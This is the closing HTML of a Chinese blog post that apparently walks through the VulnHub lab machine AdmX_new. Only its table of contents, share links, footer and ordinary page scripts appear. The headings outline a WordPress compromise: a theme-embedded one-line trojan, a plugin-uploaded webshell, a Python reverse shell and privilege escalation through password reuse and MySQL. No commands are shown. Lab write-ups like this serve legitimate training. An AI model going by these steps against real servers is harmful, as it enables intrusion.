class="toc-text">5.WordPress后台漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1%E5%B0%9D%E8%AF%95%E5%9C%A8%E2%80%9C%E4%B8%BB%E9%A2%98%E2%80%9D%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="toc-number">2.5.1.</span> <span class="toc-text">5.1尝试在“主题”插入一句话木马连接蚁剑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2%E5%88%A9%E7%94%A8%E6%8F%92%E4%BB%B6%E4%B8%8A%E4%BC%A0webshell"><span class="toc-number">2.5.2.</span> <span class="toc-text">5.2利用插件上传webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-1%E4%B8%8A%E4%BC%A0%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">5.2.1上传实现反弹shell连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-2-%E7%A1%AE%E8%AE%A4%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E4%B8%8A%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF-x2F-%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">5.2.2 确认目标靶机上可利用的信息&#x2F;软件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Kali%E7%9B%91%E5%90%AC4444%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.2.2.1.</span> <span class="toc-text">Kali监听4444端口</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E6%98%AF%E5%90%A6%E6%9C%89nc"><span class="toc-number">2.5.2.2.2.</span> <span class="toc-text">确定目标靶机是否有nc</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E6%98%AF%E5%90%A6%E6%9C%89Python%E7%8E%AF%E5%A2%83"><span class="toc-number">2.5.2.2.3.</span> <span class="toc-text">确定目标靶机是否有Python环境</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-3%E4%BD%BF%E7%94%A8python3%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81"><span class="toc-number">2.5.2.3.</span> <span class="toc-text">5.2.3使用python3反弹shell代码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3%E5%86%8D%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%9C%A8%E2%80%9C%E4%B8%BB%E9%A2%98%E2%80%9D%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.5.3.</span> <span class="toc-text">5.3再次尝试在“主题”插入一句话木马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">三、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B-x2F-etc-x2F-passwd"><span class="toc-number">3.1.</span> <span class="toc-text">1.查看&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%86%85%E6%98%AF%E5%90%A6%E6%9C%89%E8%AF%A5%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.</span> <span class="toc-text">2.查看主目录文件内是否有该用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8"><span class="toc-number">3.3.</span> <span class="toc-text">3.查看操作系统内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9C%89%E6%B2%A1%E6%9C%89sudo%E6%9D%83%E9%99%90"><span class="toc-number">3.4.</span> <span class="toc-text">4.尝试查看当前用户有没有sudo权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8BWordPress%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.</span> <span class="toc-text">5.查看WordPress的配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%98%AF%E5%90%A6%E6%9C%89%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8%E7%9A%84%E5%8F%AF%E8%83%BD%E6%80%A7"><span class="toc-number">3.6.</span> <span class="toc-text">6.是否有密码复用的可能性?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.7.</span> <span class="toc-text">7.尝试登录数据库账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%B0%9D%E8%AF%95%E6%98%AF%E5%90%A6%E5%A4%8D%E7%94%A8%E4%BA%86Web%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.</span> <span class="toc-text">8.尝试是否复用了Web页面的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BA%8C%E6%AC%A1%E6%8F%90%E6%9D%83"><span class="toc-number">3.9.</span> <span class="toc-text">9.二次提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%88%A9%E7%94%A8mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-number">3.10.</span> <span class="toc-text">10.利用mysql数据库特性</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/338a9f9f.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/338a9f9f.html&text=VulnHub-4-AdmX_new"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/338a9f9f.html&is_video=false&description=VulnHub-4-AdmX_new"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-4-AdmX_new&body=Check out this article: http://byesec.com/posts/338a9f9f.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/338a9f9f.html&name=VulnHub-4-AdmX_new&description=&lt;blockquote&gt;
+&lt;p&gt;靶机地址: &lt;a href=&#34;https://download.vulnhub.com/admx/AdmX_new.7z&#34;&gt;https://download.vulnhub.com/admx/AdmX_new.7z&lt;/a&gt;&lt;br&gt;难度等级: 中&lt;br&gt;打靶目标: 取得 2 个 flag + root 权限&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/338a9f9f.html&t=VulnHub-4-AdmX_new"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
